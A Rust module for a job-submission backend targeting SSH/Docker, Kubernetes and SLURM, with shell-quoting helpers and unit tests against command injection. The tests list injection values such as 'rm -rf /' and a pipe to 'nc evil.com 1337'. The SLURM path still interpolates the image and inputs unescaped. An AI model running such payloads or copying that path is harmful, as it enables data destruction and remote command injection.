//! Bring-your-own-compute backend.
//!
//! Routes jobs to user-provided infrastructure — SSH-accessible machines,
//! Kubernetes clusters, or SLURM schedulers. The BYOC backend translates
//! PRISM job specs into the target system's native submission format.

use anyhow::{Context, Result, bail};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::{ComputeBackend, ExperimentPlan, JobStatus};

/// Supported BYOC target types.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ByocTarget {
    /// SSH to a remote machine, run via Docker.
    Ssh {
        host: String,
        user: String,
        key_path: String,
        port: u16,
    },
    /// Submit to a Kubernetes cluster.
    Kubernetes { context: String, namespace: String },
    /// Submit to a SLURM scheduler.
    Slurm {
        head_node: String,
        user: String,
        partition: String,
    },
}

impl Default for ByocTarget {
    fn default() -> Self {
        ByocTarget::Ssh {
            host: "localhost".into(),
            user: "prism".into(),
            key_path: "~/.ssh/id_ed25519".into(),
            port: 22,
        }
    }
}

/// Bring-your-own-compute backend.
pub struct ByocBackend {
    target: ByocTarget,
}

impl ByocBackend {
    pub fn new(target: ByocTarget) -> Self {
        Self { target }
    }

    /// Build an SSH command prefix for the target host.
    fn ssh_cmd(host: &str, user: &str, key_path: &str, port: u16) -> tokio::process::Command {
        let mut cmd = tokio::process::Command::new("ssh");
        cmd.args([
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-o",
            "BatchMode=yes",
            "-i",
            key_path,
            "-p",
            &port.to_string(),
            &format!("{user}@{host}"),
        ]);
        cmd
    }
}

#[async_trait]
impl ComputeBackend for ByocBackend {
    async fn submit(&self, plan: &ExperimentPlan) -> Result<Uuid> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let job_id = Uuid::new_v4();
                let inputs_json = serde_json::to_string(&plan.inputs)?;

                // Validate image as a Docker reference — alphanumeric +
                // a small set of separators. Without this, an LLM-
                // generated tool call (or any caller passing untrusted
                // text) could pass `ubuntu; rm -rf /; #` and the
                // remote shell would execute it. See Bug #54.
                if !is_valid_docker_image(&plan.image) {
                    bail!(
                        "invalid docker image reference {:?}: must match \
                         [A-Za-z0-9._/:@-]+",
                        plan.image
                    );
                }

                // SSH to host → docker run with inputs piped via env var.
                // Single-quote-escape all interpolated values so JSON
                // payloads / image names containing apostrophes can't
                // break out of the quoted string and inject shell
                // commands. The shell-quote sequence `'\''` closes the
                // quote, escapes a literal apostrophe, and reopens.
                let docker_cmd = format!(
                    "docker run -d --name prism-job-{job_id} \
                     -e PRISM_JOB_ID={job_id} \
                     -e PRISM_INPUTS={inputs_q} \
                     {image_q}",
                    inputs_q = sh_single_quote(&inputs_json),
                    image_q = sh_single_quote(&plan.image),
                );

                tracing::info!(
                    %host, %user, %job_id, image = %plan.image,
                    "BYOC SSH: submitting job"
                );

                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(&docker_cmd);

                let output = cmd
                    .output()
                    .await
                    .with_context(|| format!("SSH to {user}@{host}:{port} failed"))?;

                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("SSH docker run failed: {stderr}");
                }

                let container_id = String::from_utf8_lossy(&output.stdout).trim().to_string();
                tracing::info!(%job_id, %container_id, "BYOC SSH: container started");

                Ok(job_id)
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let job_id = Uuid::new_v4();
                let inputs_json = serde_json::to_string(&plan.inputs)?;

                // kubectl run as a Job
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "run",
                    &format!("prism-{job_id}"),
                    "--image",
                    &plan.image,
                    "--restart=Never",
                    "--env",
                    &format!("PRISM_JOB_ID={job_id}"),
                    "--env",
                    &format!("PRISM_INPUTS={inputs_json}"),
                ]);

                tracing::info!(
                    %context, %namespace, %job_id, image = %plan.image,
                    "BYOC K8s: submitting job"
                );

                let output = cmd.output().await.context("kubectl run failed")?;
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("kubectl run failed: {stderr}");
                }

                Ok(job_id)
            }
            ByocTarget::Slurm {
                head_node,
                user,
                partition,
            } => {
                let job_id = Uuid::new_v4();
                let inputs_json = serde_json::to_string(&plan.inputs)?;

                // SSH to SLURM head node → sbatch a singularity/docker job
                let sbatch_script = format!(
                    "#!/bin/bash\n\
                     #SBATCH --job-name=prism-{job_id}\n\
                     #SBATCH --partition={partition}\n\
                     #SBATCH --output=/tmp/prism-{job_id}.out\n\
                     export PRISM_JOB_ID={job_id}\n\
                     export PRISM_INPUTS='{inputs_json}'\n\
                     singularity exec docker://{image} /entrypoint.sh\n",
                    image = plan.image,
                );

                let ssh_cmd = format!("echo '{}' | sbatch", sbatch_script.replace('\'', "'\\''"));

                tracing::info!(
                    %head_node, %user, %partition, %job_id,
                    "BYOC SLURM: submitting job"
                );

                let mut cmd = tokio::process::Command::new("ssh");
                cmd.args([
                    "-o",
                    "BatchMode=yes",
                    &format!("{user}@{head_node}"),
                    &ssh_cmd,
                ]);

                let output = cmd
                    .output()
                    .await
                    .context("SSH to SLURM head node failed")?;
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("sbatch submission failed: {stderr}");
                }

                Ok(job_id)
            }
        }
    }

    async fn status(&self, job_id: Uuid) -> Result<JobStatus> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(format!(
                    "docker inspect --format '{{{{.State.Status}}}}' prism-job-{job_id}"
                ));
                let output = cmd.output().await?;
                let status_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
                match status_str.as_str() {
                    "running" => Ok(JobStatus::Running { progress: 0.0 }),
                    "exited" => Ok(JobStatus::Completed),
                    _ => Ok(JobStatus::Failed {
                        error: format!("container status: {status_str}"),
                    }),
                }
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "get",
                    "pod",
                    &format!("prism-{job_id}"),
                    "-o",
                    "jsonpath={.status.phase}",
                ]);
                let output = cmd.output().await?;
                let phase = String::from_utf8_lossy(&output.stdout).trim().to_string();
                match phase.as_str() {
                    "Running" | "Pending" => Ok(JobStatus::Running { progress: 0.0 }),
                    "Succeeded" => Ok(JobStatus::Completed),
                    "Failed" => Ok(JobStatus::Failed {
                        error: "pod failed".into(),
                    }),
                    _ => Ok(JobStatus::Queued),
                }
            }
            ByocTarget::Slurm {
                head_node, user, ..
            } => {
                let mut cmd = tokio::process::Command::new("ssh");
                cmd.args([
                    "-o",
                    "BatchMode=yes",
                    &format!("{user}@{head_node}"),
                    &format!("squeue --name=prism-{job_id} --noheader -o %T"),
                ]);
                let output = cmd.output().await?;
                let state = String::from_utf8_lossy(&output.stdout).trim().to_string();
                match state.as_str() {
                    "RUNNING" => Ok(JobStatus::Running { progress: 0.0 }),
                    "PENDING" => Ok(JobStatus::Queued),
                    "COMPLETED" => Ok(JobStatus::Completed),
                    "FAILED" | "CANCELLED" => Ok(JobStatus::Failed { error: state }),
                    "" => Ok(JobStatus::Completed), // job no longer in queue = done
                    _ => Ok(JobStatus::Running { progress: 0.0 }),
                }
            }
        }
    }

    async fn results(&self, job_id: Uuid) -> Result<serde_json::Value> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(format!("docker logs prism-job-{job_id}"));
                let output = cmd.output().await?;
                let logs = String::from_utf8_lossy(&output.stdout).to_string();
                // Try to parse as JSON, fall back to raw text
                match serde_json::from_str(&logs) {
                    Ok(v) => Ok(v),
                    Err(_) => Ok(serde_json::json!({"output": logs})),
                }
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "logs",
                    &format!("prism-{job_id}"),
                ]);
                let output = cmd.output().await?;
                let logs = String::from_utf8_lossy(&output.stdout).to_string();
                match serde_json::from_str(&logs) {
                    Ok(v) => Ok(v),
                    Err(_) => Ok(serde_json::json!({"output": logs})),
                }
            }
            ByocTarget::Slurm {
                head_node, user, ..
            } => {
                let mut cmd = tokio::process::Command::new("ssh");
                cmd.args([
                    "-o",
                    "BatchMode=yes",
                    &format!("{user}@{head_node}"),
                    &format!("cat /tmp/prism-{job_id}.out"),
                ]);
                let output = cmd.output().await?;
                let logs = String::from_utf8_lossy(&output.stdout).to_string();
                match serde_json::from_str(&logs) {
                    Ok(v) => Ok(v),
                    Err(_) => Ok(serde_json::json!({"output": logs})),
                }
            }
        }
    }

    async fn cancel(&self, job_id: Uuid) -> Result<()> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(format!("docker rm -f prism-job-{job_id}"));
                cmd.output().await.context("SSH cancel failed")?;
                Ok(())
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "delete",
                    "pod",
                    &format!("prism-{job_id}"),
                ]);
                cmd.output().await.context("kubectl delete failed")?;
                Ok(())
            }
            ByocTarget::Slurm {
                head_node, user, ..
            } => {
                let mut cmd = tokio::process::Command::new("ssh");
                cmd.args([
                    "-o",
                    "BatchMode=yes",
                    &format!("{user}@{head_node}"),
                    &format!("scancel --name=prism-{job_id}"),
                ]);
                cmd.output().await.context("scancel failed")?;
                Ok(())
            }
        }
    }
}

// ── Shell-injection helpers (Bug #54) ───────────────────────────────────

/// Wrap a value in POSIX single quotes, escaping any internal `'` as
/// `'\''` (close-quote, escaped-apostrophe, reopen-quote). The result
/// is safe to embed in any single-shell-pipeline `bash -c` argument.
///
/// Used by the BYOC SSH path where we have to send a `docker run …`
/// command line through ssh's remote shell. Without this wrapping a
/// JSON payload containing a `'` would break out of the quoting and
/// let the rest be interpreted as a separate shell command.
fn sh_single_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

/// Validate a Docker image reference. Permissive enough to accept all
/// real-world tags (digests, registries, ports, namespaces) but
/// strict enough to reject obvious shell-injection attempts.
fn is_valid_docker_image(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 256
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | ':' | '-' | '@'))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_byoc_is_ssh() {
        let target = ByocTarget::default();
        assert!(matches!(target, ByocTarget::Ssh { .. }));
    }

    #[test]
    fn byoc_target_serializes() {
        let target = ByocTarget::Kubernetes {
            context: "prod".into(),
            namespace: "prism".into(),
        };
        let json = serde_json::to_string(&target).unwrap();
        assert!(json.contains("Kubernetes"));
        assert!(json.contains("prism"));
    }

    #[test]
    fn slurm_target_serializes() {
        let target = ByocTarget::Slurm {
            head_node: "hpc.lab.internal".into(),
            user: "researcher".into(),
            partition: "gpu".into(),
        };
        let json = serde_json::to_string(&target).unwrap();
        let back: ByocTarget = serde_json::from_str(&json).unwrap();
        if let ByocTarget::Slurm {
            head_node,
            partition,
            ..
        } = back
        {
            assert_eq!(head_node, "hpc.lab.internal");
            assert_eq!(partition, "gpu");
        } else {
            panic!("expected Slurm");
        }
    }

    #[test]
    fn ssh_target_roundtrip() {
        let target = ByocTarget::Ssh {
            host: "gpu-box.lab".into(),
            user: "admin".into(),
            key_path: "/home/admin/.ssh/id_ed25519".into(),
            port: 2222,
        };
        let json = serde_json::to_string(&target).unwrap();
        let back: ByocTarget = serde_json::from_str(&json).unwrap();
        if let ByocTarget::Ssh { host, port, .. } = back {
            assert_eq!(host, "gpu-box.lab");
            assert_eq!(port, 2222);
        } else {
            panic!("expected Ssh");
        }
    }

    #[test]
    fn sh_single_quote_wraps_plain_string() {
        assert_eq!(sh_single_quote("hello"), "'hello'");
    }

    #[test]
    fn sh_single_quote_escapes_apostrophe() {
        // The classic injection — a stray apostrophe must be replaced
        // with the close-escape-reopen sequence so the payload stays
        // contained inside the quoted string.
        assert_eq!(sh_single_quote("don't"), r"'don'\''t'");
    }

    #[test]
    fn sh_single_quote_handles_injection_payload() {
        // Realistic injection: JSON-ish input that ends with `'); rm -rf /; #`
        // would close the wrapping quote and execute the rest. Verify
        // the escape neutralises it.
        let payload = "{\"k\":\"v\"}'); rm -rf /; #";
        let q = sh_single_quote(payload);
        // The result must start and end with `'` and contain no
        // unescaped apostrophe in between.
        assert!(q.starts_with('\''));
        assert!(q.ends_with('\''));
        // Apostrophes are present only as the escape sequence.
        let inner = &q[1..q.len() - 1];
        // Every literal ' becomes '\''  → split on '\'' produces N+1 pieces
        // none of which contain a bare '.
        for piece in inner.split(r"'\''") {
            assert!(!piece.contains('\''), "unescaped quote in {piece}");
        }
    }

    #[test]
    fn is_valid_docker_image_accepts_real_refs() {
        assert!(is_valid_docker_image("ubuntu"));
        assert!(is_valid_docker_image("ubuntu:22.04"));
        assert!(is_valid_docker_image("ghcr.io/user/repo:latest"));
        assert!(is_valid_docker_image(
            "gcr.io/proj/img@sha256:abcdef0123456789"
        ));
        assert!(is_valid_docker_image("registry.local:5000/img:v1"));
    }

    #[test]
    fn is_valid_docker_image_rejects_injection_attempts() {
        assert!(!is_valid_docker_image(""));
        assert!(!is_valid_docker_image("ubuntu; rm -rf /"));
        assert!(!is_valid_docker_image("ubuntu\nfoo"));
        assert!(!is_valid_docker_image("ubuntu`whoami`"));
        assert!(!is_valid_docker_image("ubuntu$(id)"));
        assert!(!is_valid_docker_image("ubuntu | nc evil.com 1337"));
        assert!(!is_valid_docker_image(&"a".repeat(257)));
    }
}
